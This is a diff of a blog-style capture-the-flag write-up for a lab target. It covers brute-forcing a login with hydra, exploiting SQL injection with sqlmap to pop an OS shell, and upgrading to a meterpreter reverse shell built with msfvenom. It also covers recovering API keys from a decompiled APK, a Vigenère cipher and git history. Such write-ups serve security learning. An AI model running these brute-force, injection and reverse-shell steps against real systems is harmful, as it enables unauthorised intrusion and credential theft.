@@ -10,115 +10,143 @@ toc: true
 
 ## Question 2: What is the API key that fits the following pattern: "WEB*"
 
-Ennumeate web directories with dirb
+Question 2 was the first question solved by our team. The IP address given by the challenge dashboard provides a website with several PDFs and a login form. 
 
-Get post data for login form
+The login form was tested for SQL vulnerabilities but none were found. The PDFs were downloaded and analysed, which found the metadata of them contained a consistent author "billg", which looked like a potential username.
 
-Brute force login form with Hydra
+>
+{% highlight text %}
+root@kali-persistent:~/ctf/hackback2/borderlands/pdfs# ls | xargs exiftool | grep Author
+Author                          : billg
+Author                          : billg
+Author                          : billg
+Author                          : billg
+Author                          : billg
+{% endhighlight  %}
 
-hydra -I -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt 10.10.221.98 http-post-form "/:username=^USER^&password=^PASS^:F=bad username"
+As such, the parameters of the login form were identified by anaylsising the POST requestc in Firefox, and the password was brute forced using hydra with the "rockyou" password list.
 
-billg:potato
+>
+{% highlight bash %}
+hydra -I -l "billg" -P /usr/share/wordlists/rockyou.txt [deployed ip] http-post-form "/:username=^USER^&password=^PASS^:F=bad username"
+{% endhighlight  %}
+
+
+This revealed the username as password to be "billg:potato".
+
+![Hydra Results]({{ '/assets/images/hackback-2/hydra-results.png' | relative_url }}){: .center-image }*Results of Hydra running against login form*
+
+Once logged in, an interface listing the PDFs found on the previous page is displayed. When a PDF is clicked on, rather than downloading it, it displays a list of information about the documents utilising an "api.php" page with some get parameters, including the API key we are looking for.
+
+![Web API Key]({{ '/assets/images/hackback-2/web-api-key.png' | relative_url }}){: .center-image }*URL containing Web API Key*
 
 ## Question 4: What is the flag in the /var/www directory of the web app host? {FLAG:Webapp:XXX}
 
-API uses SQL, use SQL map to check for injection
+The format of the data returned by the API looks like it could be contained in a database. As such, SQL Map was used to evaluate if it was vulnerable to SQL injection or not. 
 
+>
+{% highlight bash %}
 sqlmap --random-agent -u "http://10.10.221.98/api.php?documentid=2&apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD" -p documentid
+{% endhighlight  %}
 
-Pop a shell using --os-shell
+![SQL Map Results]({{ '/assets/images/hackback-2/sql-map.png' | relative_url }}){: .center-image }*Injection vulnerability found using SQLMap*
 
-Use msfvenom to generate meterpreter for better shell
+This confirmed my hunch and a shell was popped using the "--os-shell" command. This uploads a file uploaded and a reverse shell to the server, guessing where the web directory is, and catches the connection from the script.
 
-msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.8.0.125 -f elf -o shell
+However, this shell is lacking in features and can be particularly unstable. As such, I decided to upgrade my shell to a meterpreter shell before continuing. This was done by creating a standard linux executable reverse shell using msfvenom, and uploading it to web server with SQLMaps file stager, which is created during the reverse shell process.
 
-Drop using sqlmap file stager
 
-msfconsole
+![File Stager]({{ '/assets/images/hackback-2/file-stager.png' | relative_url }}){: .center-image }*File stager uploaded by SQLMap*
 
-Set up handler
 
-Run reverse shell from SQLMap shell
+Metasploit's console was used to create a handler for this shell, and the reverse shell was executed using the shell created by SQLMap. This allowed the flag under "/var/www" to be discovered and extracted.
 
-cat flag
+![Web App Flag]({{ '/assets/images/hackback-2/webapp-flag.png' | relative_url }}){: .center-image }*Flag found under "/var/www/" using meterpreter shell*
+
+This flag could have been obtained under the SQLMap shell, but the meterpreter shell will be useful furture future questions.
 
 ## Question 1: What is the API key that fits the following pattern: "AND*"
 
-Decompile APK using APKTool
+The inital website also contains an apk file, which is likely what the "AND"(roid) part of the API key refers tool. The APK was decompiled using APK Tool, which provides the source code for the app. "dex2jar" can be used to get more readable java code, however, given the relative similicity of this app, it was not required.
 
-Check source code for activies
+Straight away, two activity files can be seen, "MainActivity", and "Main2Activity". The first activity simply creates a button which opens the second activity.
 
-MainActivity open Main2Activity
+The second activity, has an unimplemented decryption function, which appears would decrypt the API key we are looking for, and would be used to make a request to the same API endpoint found with the Web API key.
 
-MainActivity2 references api.php and a string resource that is decrypted by an unimplemented function that uses another string as a key
+![Decryption Function]({{ '/assets/images/hackback-2/decrypt-function.png' | relative_url }}){: .center-image }*Decryption function which has not been implemented*
 
+This key appears to be stored as a string resource, so the next place that was analysed was the "strings.xml" resource file, which gives us the encrypted API key.
+
+>
+{% highlight text %}
 <string name="encrypted_api_key">CBQOSTEFZNL5U8LJB2hhBTDvQi2zQo</string>
+{% endhighlight  %}
 
-Doesn't look encoded
 
-Probably a fairly basic cipher as no hints to implementation are given
+Given that we have no implentation details, it is likely this a fairly basic cipher. From the pattern in the question we know that it starts with "AND", however given the difference in distance from C-A and B-N, it cannot be a caeser cipher.
 
-We know it starts with "AND"
+It also doesn't look like it follows a typical encoding scheme, however, given that we now had shell access to the web server, we could check how the API keys were checked.
 
-Cannot be caeser cipher - distance from C-A and B-N is difference
 
-Potentially Vigenère cipher
-
-Now we have access to the web server we can look at api.php to see how the API keys are checked
+>
+{% highlight php %}
 
 if (!isset($_GET['apikey']) || ((substr($_GET['apikey'], 0, 20) !== "WEBLhvOJAH8d50Z4y5G5") && substr($_GET['apikey'], 0, 20) !== "ANDVOWLDLAS5Q8OQZ2tu" && substr($_GET['apikey'], 0, 20) !== "GITtFi80llzs4TxqMWtC"))
 {
     die("Invalid API key");
 }
+{% endhighlight  %}
 
-Doesn't give us full key but gives us a very big crib, if we use until the first number(numbers can't be part of key), should reveal the key
+As it only checks the first 20 characters, this does not give us the full API key, however, it does give us a very large crib to use. Given the probable simplicity of the encryption method, the next thing that was tried was a Vigenère cipher.
 
-CONTEXTCONT5U8YGG2tlQQSvYi2mNt
+If we take the the encrypted API key in the source code and decode it using Cyber Chefs Vigenère cipher function using the crib found in the source code (until the first number as it cannot be included in a Vigenère key), it should decode to a repeating word which will be the key used to encrypt the full key.
 
-Context seems like a sane key
 
-ANDVOWLDLAS5Q8OQZ2tuIPGcOu2mXk
+Sure enough this revealed "CONTEXTCONT5U8YGG2tlQQSvYi2mNt", making "CONTEXT" the key we are looking for. This could potentially be guessed as Context we the creators of this challenge, and using "AND" as a crib gives us "CON", which could be enough information to guess the full key.
 
-Could guess this from context ;) and just the crib of "AND" revealing "CON"
+Now we have access to the web server we can look at api.php to see how the API keys are checked
+
+
 
 ## Question 3: What is the API key that fits the following pattern: "GIT*"
 
 Could be done through directory discovery but much easier once you have web server access.
 
-https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/
+This question could be done entirely through directory discovery as shown [here](https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/
+), however, given that we have a shell on the shell it was easier to download it using meterpreter.
 
-Instead:
+>
+{% highlight text %}
 metepreter> download .git
+{% endhighlight  %}
 
-Files will be in the working directory you opened msfconsole from
+This will download the files to the working directory msfconsole was opened in. The ".git" folder was moved to a new folder, and the files were restored with "git checkout -- .". The commit history was then viewed with "git log". The git repository contains the source code of the website, and one of the commits references "sensitive data"
 
-Move .git to new folder
-
-git checkout -- .
-
-git log
-
-Shows commit history
-
+>
+{% highlight text %}
 commit b2f776a52fe81a731c6c0fa896e7f9548aafceab
 Author: Context Information Security <recruitment@contextis.com>
 Date:   Tue Sep 10 14:41:00 2019 +0100
 
     removed sensitive data
+{% endhighlight  %}
 
-Looks like what we're looking for
+This looks like what we are looking for, so the repositor was reverted back to this verion with the following command:
 
+>
+{% highlight bash %}
 git revert b2f776a52fe81a731c6c0fa896e7f9548aafceab
+{% endhighlight  %}
 
+The "api.php" file then contains the full "GIT" API key, which is the flag for this question.
+
+>
+{% highlight php %}
 if (!isset($_GET['apikey']) || ((substr($_GET['apikey'], 0, 20) !== "WEBLhvOJAH8d50Z4y5G5") && substr($_GET['apikey'], 0, 20) !== "ANDVOWLDLAS5Q8OQZ2tu" && substr($_GET['apikey'], 0, 20) !== "GITtFi80llzs4TxqMWtCotiTZpf0HC"))
 {
     die("Invalid API key");
 }
-
-Has full API key: 
-
-b2f776a52fe81a731c6c0fa896e7f9548aafceab
-
+{% endhighlight  %}
 
 ## Question 5: What is the flag in the /root/ directory of router1? {FLAG:Router1:XXX}
 
